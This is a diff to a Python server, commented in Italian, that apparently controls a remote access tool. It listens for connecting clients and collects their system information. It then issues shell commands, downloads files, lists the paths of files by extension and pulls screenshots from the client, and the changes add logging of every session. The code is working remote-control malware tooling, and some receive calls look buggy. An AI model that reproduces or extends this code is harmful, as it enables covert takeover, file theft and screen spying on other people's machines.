@@ -1,3 +1,4 @@
+import os
 import pickle
 from socket import *
 import platform
@@ -14,7 +15,7 @@ PORT = 8082  # Porta di 2Ascolto del TCP
 ADDR = (IP, PORT)
 SIZE = 4096
 FORMAT = "utf-8"
-
+fileLog = "###FILELOG RESULT###\n"
 
 # OK funzione di pulizia schermo per unix e windows
 def clearScreen():
@@ -64,7 +65,7 @@ def commandsHelp():
     print("####################################")
 
 
-#  STAMPA INFO CLIENT
+# OK STAMPA INFO CLIENT
 def printInformazioni(clientConnection):
     # Ricezione del file dal Client
     buff = 1
@@ -100,6 +101,8 @@ def printInformazioni(clientConnection):
                         break
 
             print(buff)
+            global fileLog
+            fileLog=fileLog+"\n"+buff+"\n"
 
         if risposta == '1':
             print(f"[RECEIVING] Informazioni ricevute\n")
@@ -109,10 +112,11 @@ def printInformazioni(clientConnection):
         raise Exception
 
 
+# FILESPATH
 def filespath(clientConnection):
     try:
-        nomeFile = "file.txt"
-        file = open(nomeFile, 'wb')
+        nomeFile = "FilesPath.txt"
+        file = open(nomeFile, 'ab')
         newNBytes = ""
         filesize = clientConnection.recv(256).decode(FORMAT)
         if filesize == "Download fallito":
@@ -122,7 +126,7 @@ def filespath(clientConnection):
             while filesize[0:1].isdigit():
                 newNBytes = newNBytes + filesize[0:1]
                 filesize = filesize[1:]
-            file.write(clientConnection.recv(int(newNBytes)))
+            file.write(clientConnection.recv(int(newNBytes)+8000))
             time.sleep(3)
         elif filesize[0:7] == "[ERROR]":
             print(filesize)
@@ -136,6 +140,9 @@ def filespath(clientConnection):
     except:
         traceback.print_exc()
         print("Filespath ha dato problemi\n")
+
+
+# CONTROLLO REMOTO
 def remoteControl(clientConnection):
     while True:
         try:
@@ -150,6 +157,9 @@ def remoteControl(clientConnection):
             while comando == "":
                 comando = input(path + "$ ")
 
+            global fileLog
+            fileLog=fileLog+"\n"+path + "$ "+comando+"\n"
+
             clientConnection.send((comando).encode(FORMAT))
             if comando == "exit":
                 print(f"[REMOTE CONTROL CLOSED] Procedura di controllo remoto conclusa con successo!\n")
@@ -159,6 +169,7 @@ def remoteControl(clientConnection):
                 listdir = pickle.loads(clientConnection.recv(1024))
                 for item in listdir:
                     print("-: " + item)
+                    fileLog = fileLog + "\n" + "-: " + item + "\n"
             elif comando[0:8] == "download":
                 try:
                     # Write File in binary
@@ -179,6 +190,8 @@ def remoteControl(clientConnection):
             elif comando == "pwd":
                 pwdresult = clientConnection.recv(1024).decode(FORMAT)
                 print(pwdresult)
+                fileLog = fileLog + "\n" + pwdresult + "\n"
+
             # "Crea un file .txt con i percorsi di tutti i file con una certa estensione:   filespath <estensione>"
             elif comando[0:9] == "filespath":
                 filespath(clientConnection)
@@ -190,32 +203,55 @@ def remoteControl(clientConnection):
                     listresult = pickle.loads(clientConnection.recv(1024))
                     for item in listresult:
                         print("-: " + item)
+                        fileLog = fileLog + "\n" + "-: " + item + "\n"
+
                 elif msg == "Connessione interrotta":
                     print("Connessione interrotta\n")
+                    fileLog = fileLog + "\n" + "Connessione interrotta\n" + "\n"
+
                     break
                 elif msg == "Si è verificato un errore, verifica il comando":
                     print("Si è verificato un errore, verifica il comando...\n")
+                    fileLog = fileLog + "\n" + "Si è verificato un errore, verifica il comando...\n" + "\n"
 
             elif comando == "clear":
                 clearScreen()
             elif comando == "help":
                 commandsHelp()
+            elif comando[0:5] == "cd .." or comando[0:2] == "cd":
+                pass
+            elif comando[0:4] == "info":
+                output = clientConnection.recv(1024).decode(FORMAT)
+                print(output)
+                fileLog = fileLog + "\n" + output + "\n"
+            elif comando[0:10] == "screenshot":
+                myScreenshot=clientConnection.recv(1310720000)
+                nomeFoto=input("Inserisci il nome della foto: ")
+                file = open(nomeFoto, "wb")
+                file.write(myScreenshot)
+                file.close()
             else:
                 msg = clientConnection.recv(1024).decode(FORMAT)
                 if msg == "Dati in arrivo...":
                     print("Dati in arrivo...\n")
                     filesize=clientConnection.recv(256).decode(FORMAT)
-                    output = clientConnection.recv(filesize)
-                    print(output.decode())
+                    output = clientConnection.recv(filesize).decode(FORMAT)
+                    print(output)
+                    fileLog = fileLog + "\n" + output + "\n"
+
                 elif msg == "Connessione interrotta":
                     print("Connessione interrotta\n")
+                    fileLog = fileLog + "\n" + "Connessione interrotta\n" + "\n"
+
                     break
                 elif msg == "Si è verificato un errore, verifica il comando":
                     print("Si è verificato un errore, verifica il comando...\n")
-                
+                    fileLog = fileLog + "\n" + "Si è verificato un errore, verifica il comando...\n" + "\n"
+
         except Exception as e:
             if e.__class__.__name__ == "ConnectionResetError":
                 print(f"[CONNECTION INTERRUPTED] Connessione interrotta\n")
+                fileLog = fileLog + "\n" + "[CONNECTION INTERRUPTED] Connessione interrotta\n" + "\n"
                 raise e
             raise e
 
@@ -231,8 +267,14 @@ def main():
 
             clientConnection, addr = server.accept()
             print(f"\n[CONNECTED] Client {addr} is connected to the server")
+            os.mkdir(f"cartellaClient {addr}")
+            os.chdir(os.getcwd()+"/"+f"cartellaClient {addr}")
+            global fileLog
+            fileLog = fileLog + "\n" + "\n[CONNECTED] Client {addr} is connected to the server" + "\n"
 
             print(f"INFORMAZIONI SISTEMA OPERATIVO CLIENT:\n")
+            fileLog = fileLog + "\n" + "INFORMAZIONI SISTEMA OPERATIVO CLIENT:\n" + "\n"
+
             t_end = time.time() + 3
             while time.time() < t_end:
                 print(".", end="")
@@ -251,6 +293,8 @@ def main():
                     exit = True
                 else:
                     print(f"[ERROR] Qualcosa nella print informazioni non ha funzionato... attendi\n")
+                    fileLog = fileLog + "\n" + "[ERROR] Qualcosa nella print informazioni non ha funzionato... attendi\n" + "\n"
+
                     t_end = time.time() + 5
                     while time.time() < t_end:
                         print(".", end="")
@@ -277,8 +321,10 @@ def main():
                     attivo = 0
 
                 except Exception as e:
+                    traceback.print_exc()
                     if e.__class__.__name__ == "ConnectionResetError":
                         print(f"La connessione con il client si è interrotta\n")
+                        fileLog = fileLog + "\n" + "La connessione con il client si è interrotta\n" + "\n"
                         attivo = 0
                         raise e
                     else:
@@ -306,6 +352,10 @@ def main():
                 server.close()
                 sys.exit(0)
             elif restartDecision == '1':
+                file = open("fileLog.txt", "w")
+                file.write(fileLog)
+                file.close()
+                fileLog=""
                 print(f"[INFO] The server keeps listening...")
                 t_end = time.time() + 5
                 while time.time() < t_end:
@@ -316,6 +366,10 @@ def main():
                     print(".")
                     time.sleep(1)
             else:
+                file = open("fileLog.txt", "w")
+                file.write(fileLog)
+                file.close()
+                fileLog = ""
                 clientConnection.close()
                 server.close()
 
@@ -329,6 +383,10 @@ if __name__ == "__main__":
     try:
         main()
     except:
+        file = open("fileLog.txt", "w")
+        file.write(fileLog)
+        file.close()
+        fileLog = ""
         print(f"[CLOSE] Server chiuso.")
         t_end = time.time() + 10
         while time.time() < t_end:
